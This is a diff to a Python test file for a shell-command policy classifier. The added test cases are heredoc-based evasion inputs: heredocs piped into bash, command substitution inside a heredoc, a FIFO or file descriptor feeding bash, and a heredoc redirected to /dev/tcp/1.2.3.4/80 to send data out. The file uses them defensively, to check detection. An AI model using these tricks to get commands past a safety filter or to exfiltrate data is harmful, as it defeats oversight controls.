@@ -133,6 +133,24 @@ def test_chain_unterminated_heredoc_body_runs_to_end() -> None:
     assert "subcommand chain" not in classify_command(cmd).reason
 
 
+def test_chain_heredoc_stripper_is_linear() -> None:
+    """Second review: thousands of operators on one line went quadratic
+    (28 s at 100 KB). Bounded now: past four operators a line gets no
+    exemption and no per-operator analysis."""
+    import time
+
+    from notari.policy import _strip_heredoc_bodies
+
+    many_ops = "cat " + "<<A " * 25_000 + "\n" + _CHAIN_25
+    big_body = "cat > /tmp/x <<'EOF'\n" + ("a; b; c\n" * 50_000) + "EOF"
+    for cmd in (many_ops, big_body):
+        t0 = time.perf_counter()
+        _strip_heredoc_bodies(cmd)
+        assert time.perf_counter() - t0 < 2.0
+    assert "subcommand chain" in classify_command(many_ops).reason
+    assert "subcommand chain" not in classify_command(big_body).reason
+
+
 _ECHOS_30 = "\n".join(f"echo {i};" for i in range(30))
 
 
@@ -173,6 +191,19 @@ _ECHOS_30 = "\n".join(f"echo {i};" for i in range(30))
         f"cat <<EOF\r\nx\r\nEOF\r\n{_ECHOS_30}",
         # a heredoc opener inside an executed body must not swallow what follows
         f"bash <<EOF\ncat <<X\nEOF\n{_ECHOS_30}",
+        # second review: fd games before the pipe, and a continued line
+        f"cat <<EOF 2>&1 | bash\n{_ECHOS_30}\nEOF",
+        f"cat <<EOF >&2 | bash\n{_ECHOS_30}\nEOF",
+        f"cat <<EOF \\\n| bash\n{_ECHOS_30}\nEOF",
+        # second review: an unquoted delimiter expands the body
+        "cat <<EOF\n$(" + _CHAIN_25 + ")\nEOF",
+        "cat <<EOF\n`" + _CHAIN_25 + "`\nEOF",
+        # second review: an fd set up earlier points at an executor
+        f"exec 3> >(bash); cat <<EOF >&3\n{_ECHOS_30}\nEOF",
+        f"mkfifo /tmp/p; bash </tmp/p & cat <<'EOF' >/tmp/p\n{_ECHOS_30}\nEOF",
+        f"cat <<'EOF' >/dev/tcp/1.2.3.4/80\n{_ECHOS_30}\nEOF",
+        # more than four operators on one line: no exemption at all
+        "cat <<A <<A <<A <<A <<A\n" + _CHAIN_25,
     ],
 )
 def test_chain_executed_heredoc_bodies_still_counted(cmd: str) -> None:
